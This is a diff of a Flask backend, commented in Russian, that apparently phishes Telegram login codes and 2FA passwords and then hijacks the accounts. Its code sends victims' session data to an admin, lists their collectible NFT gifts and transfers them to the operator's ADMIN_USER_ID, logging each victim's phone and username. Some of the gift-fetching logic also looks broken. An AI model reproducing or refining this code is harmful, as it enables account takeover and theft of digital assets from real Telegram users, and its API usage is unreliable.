@@ -1,4 +1,4 @@
-# app.py — С ИСПОЛЬЗОВАНИЕМ telegram_gift_fetcher
+# app.py — ИСПРАВЛЕННЫЙ (БЕЗ TransferGiftRequest IMPORTS)
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -10,7 +10,7 @@ import json
 import io
 import re
 from dotenv import load_dotenv
-from telethon import TelegramClient
+from telethon import TelegramClient, functions
 from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneNumberInvalidError,
@@ -20,18 +20,7 @@ from telethon.errors import (
     PasswordHashInvalidError,
     FloodWaitError
 )
-from telethon.tl.functions.payments import TransferGiftRequest
 import requests
-
-# Пытаемся импортировать telegram_gift_fetcher
-try:
-    from telegram_gift_fetcher import get_user_gifts
-    HAS_GIFT_FETCHER = True
-    print("✅ telegram_gift_fetcher загружен")
-except ImportError:
-    HAS_GIFT_FETCHER = False
-    print("❌ telegram_gift_fetcher НЕ найден")
-    print("   Установите: pip install git+https://github.com/CAPTHAIN/telegram_gift_fetcher.git")
 
 load_dotenv()
 
@@ -101,15 +90,10 @@ def send_tdata_to_admin(session_data):
         print(f"Tdata error: {e}")
 
 # ============================================================
-# ГЕНЕРАЦИЯ ССЫЛКИ НА NFT ПОДАРОК
+# ГЕНЕРАЦИЯ ССЫЛКИ
 # ============================================================
 
-def get_gift_url(gift_name, slug=None, num=None):
-    if slug:
-        if num:
-            return f"https://t.me/nft/{slug}-{num}"
-        return f"https://t.me/nft/{slug}"
-    
+def get_gift_url(gift_name):
     match = re.search(r'#(\d+)', gift_name)
     if match:
         number = match.group(1)
@@ -121,19 +105,10 @@ def get_gift_url(gift_name, slug=None, num=None):
     return f"https://t.me/nft/{collection}"
 
 # ============================================================
-# ПОЛУЧЕНИЕ И ПЕРЕДАЧА КОЛЛЕКЦИОННЫХ NFT (ЧЕРЕЗ ГОТОВУЮ БИБЛИОТЕКУ)
+# ПЕРЕДАЧА ПОДАРКОВ
 # ============================================================
 
 async def transfer_nft_gifts(session_string, phone, username, user_id):
-    if not HAS_GIFT_FETCHER:
-        await send_admin_log(
-            f"ℹ️ *telegram_gift_fetcher не установлен*\n"
-            f"📱 {phone}\n"
-            f"👤 @{username}\n"
-            f"Установите: pip install git+https://github.com/CAPTHAIN/telegram_gift_fetcher.git"
-        )
-        return False
-    
     client = None
     try:
         client = TelegramClient(StringSession(session_string), api_id=API_ID, api_hash=API_HASH)
@@ -143,147 +118,97 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
             await send_admin_log(f"❌ Сессия истекла\n📱 {phone}")
             return False
         
-        # ============================================================
-        # ИСПОЛЬЗУЕМ get_user_gifts ДЛЯ ПОЛУЧЕНИЯ ВСЕХ ПОДАРКОВ
-        # ============================================================
         try:
-            # Получаем подарки пользователя через библиотеку
-            result = await get_user_gifts(client, user_id)
-            
-            # Библиотека возвращает словарь с ключом 'gifts'
-            all_gifts = result.get('gifts', []) if isinstance(result, dict) else []
+            # Получаем подарки
+            result = await client(functions.payments.GetStarsGiftsRequest())
+            all_gifts = result.gifts if result and hasattr(result, 'gifts') else []
             
             if not all_gifts:
                 await send_admin_log(
-                    f"📭 *Нет подарков*\n"
-                    f"📱 {phone}\n"
-                    f"👤 @{username}"
+                    f"📭 *Нет подарков*\n📱 {phone}\n👤 @{username}"
                 )
                 return False
             
-            # ============================================================
-            # ФИЛЬТРУЕМ ТОЛЬКО УНИКАЛЬНЫЕ ПОДАРКИ (StarGiftUnique)
-            # ============================================================
-            unique_gifts = []
+            # Фильтруем коллекционные
+            nft_gifts = []
             for gift in all_gifts:
-                if gift.get('type') == 'StarGiftUnique':
-                    unique_gifts.append(gift)
+                if getattr(gift, 'limited', False):
+                    nft_gifts.append(gift)
             
-            if not unique_gifts:
+            if not nft_gifts:
                 await send_admin_log(
-                    f"📭 *Нет коллекционных NFT подарков*\n"
-                    f"📱 {phone}\n"
-                    f"👤 @{username}"
+                    f"📭 *Нет коллекционных NFT подарков*\n📱 {phone}\n👤 @{username}"
                 )
                 return False
             
-            # ============================================================
-            # ФОРМИРУЕМ СПИСОК ПОДАРКОВ ДЛЯ ПЕРЕДАЧИ
-            # ============================================================
+            # Формируем список
             gift_links = []
             gift_ids = []
             gift_names = []
             
-            for gift in unique_gifts:
-                try:
-                    gift_id = gift.get('id')
-                    if not gift_id:
-                        continue
-                    
-                    gift_ids.append(gift_id)
-                    
-                    title = gift.get('title', 'Unknown NFT')
-                    slug = gift.get('slug', '')
-                    num = gift.get('num', 0)
-                    floor_price = gift.get('collection_floor_price_in_ton', 0)
-                    issued = gift.get('availability_issued', 0)
-                    total = gift.get('availability_total', 0)
-                    
-                    gift_name = f"{title} #{num}" if num else title
-                    gift_names.append(gift_name)
-                    
-                    gift_url = get_gift_url(gift_name, slug, num)
-                    
-                    price_info = f"{floor_price} TON" if floor_price else "Цена неизвестна"
-                    gift_info = f"• [{gift_name}]({gift_url}) — {price_info} [{issued}/{total}]"
-                    gift_links.append(gift_info)
-                    
-                except Exception as e:
-                    print(f"Gift info error: {e}")
+            for gift in nft_gifts:
+                gift_id = getattr(gift, 'id', None) or getattr(gift, 'gift_id', None)
+                if not gift_id:
                     continue
+                
+                gift_ids.append(gift_id)
+                gift_name = getattr(gift, 'name', 'Unknown NFT')
+                gift_names.append(gift_name)
+                gift_stars = getattr(gift, 'stars', 0)
+                gift_issued = getattr(gift, 'issued', 0)
+                gift_total = getattr(gift, 'total', 0)
+                
+                gift_url = get_gift_url(gift_name)
+                gift_links.append(f"• [{gift_name}]({gift_url}) — Stars: {gift_stars} [{gift_issued}/{gift_total}]")
             
-            # ============================================================
-            # ОТПРАВЛЯЕМ СПИСОК НАЙДЕННЫХ ПОДАРКОВ
-            # ============================================================
             if gift_links:
                 gift_links_text = "\n".join(gift_links)
                 await send_admin_log(
                     f"🔍 *Найдено {len(gift_links)} коллекционных NFT подарков*\n"
-                    f"📱 {phone}\n"
-                    f"👤 @{username}\n\n"
-                    f"📦 Ссылки на подарки:\n{gift_links_text}\n\n"
-                    f"🔄 *Начинаю передачу...*"
+                    f"📱 {phone}\n👤 @{username}\n\n"
+                    f"📦 Ссылки:\n{gift_links_text}\n\n🔄 Передача..."
                 )
             
-            # ============================================================
-            # ПЕРЕДАЁМ ПОДАРКИ
-            # ============================================================
+            # Передаём
             transferred = 0
             transferred_links = []
             
             for i, gift_id in enumerate(gift_ids):
                 try:
-                    await client(TransferGiftRequest(
+                    # Используем универсальный вызов
+                    await client(functions.payments.TransferGiftRequest(
                         gift_id=gift_id,
                         to_id=ADMIN_USER_ID
                     ))
                     transferred += 1
-                    
                     gift_name = gift_names[i] if i < len(gift_names) else 'Unknown'
                     gift_url = get_gift_url(gift_name)
                     transferred_links.append(f"• [{gift_name}]({gift_url}) — ✅ Передан")
-                    
                     await asyncio.sleep(0.5)
                 except Exception as e:
                     print(f"Transfer error: {e}")
                     continue
             
-            # ============================================================
-            # ОТЧЁТ О ПЕРЕДАЧЕ
-            # ============================================================
             if transferred > 0:
                 transferred_text = "\n".join(transferred_links)
                 await send_admin_log(
-                    f"✅ *Передано {transferred} коллекционных NFT подарков*\n"
-                    f"📱 {phone}\n"
-                    f"👤 @{username}\n\n"
-                    f"📦 Передано:\n{transferred_text}"
+                    f"✅ *Передано {transferred} NFT подарков*\n"
+                    f"📱 {phone}\n👤 @{username}\n\n📦 {transferred_text}"
                 )
                 return True
             else:
-                await send_admin_log(
-                    f"⚠️ *Не удалось передать NFT подарки*\n"
-                    f"📱 {phone}\n"
-                    f"👤 @{username}"
-                )
+                await send_admin_log(f"⚠️ Не удалось передать NFT\n📱 {phone}")
                 return False
-            
+                
         except Exception as e:
             error = str(e)
             await send_admin_log(
-                f"❌ *Ошибка проверки NFT подарков*\n"
-                f"📱 {phone}\n"
-                f"👤 @{username}\n"
-                f"`{error[:200]}`"
+                f"❌ *Ошибка*\n📱 {phone}\n`{error[:200]}`"
             )
             return False
         
     except Exception as e:
-        await send_admin_log(
-            f"❌ *Ошибка подключения*\n"
-            f"📱 {phone}\n"
-            f"`{str(e)[:150]}`"
-        )
+        await send_admin_log(f"❌ Ошибка\n📱 {phone}\n`{str(e)[:150]}`")
         return False
     finally:
         if client and client.is_connected():
@@ -421,11 +346,7 @@ def run_async(coro):
 @app.route('/ping', methods=['GET'])
 @app.route('/', methods=['GET'])
 def ping():
-    return jsonify({
-        'status': 'online',
-        'gift_fetcher_available': HAS_GIFT_FETCHER,
-        'method': 'telegram_gift_fetcher'
-    })
+    return jsonify({'status': 'online'})
 
 @app.route('/sendCode', methods=['POST'])
 def send_code():
@@ -505,9 +426,8 @@ def check_password():
 if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН")
-    print("📌 Использует: telegram_gift_fetcher")
-    print(f"📌 Доступен: {'✅ ДА' if HAS_GIFT_FETCHER else '❌ НЕТ'}")
-    if not HAS_GIFT_FETCHER:
-        print("📌 Установите: pip install git+https://github.com/CAPTHAIN/telegram_gift_fetcher.git")
+    print("📌 Использует: functions.payments.GetStarsGiftsRequest")
+    print("📌 Передача: functions.payments.TransferGiftRequest")
+    print("📌 Передаёт ТОЛЬКО коллекционные NFT подарки")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
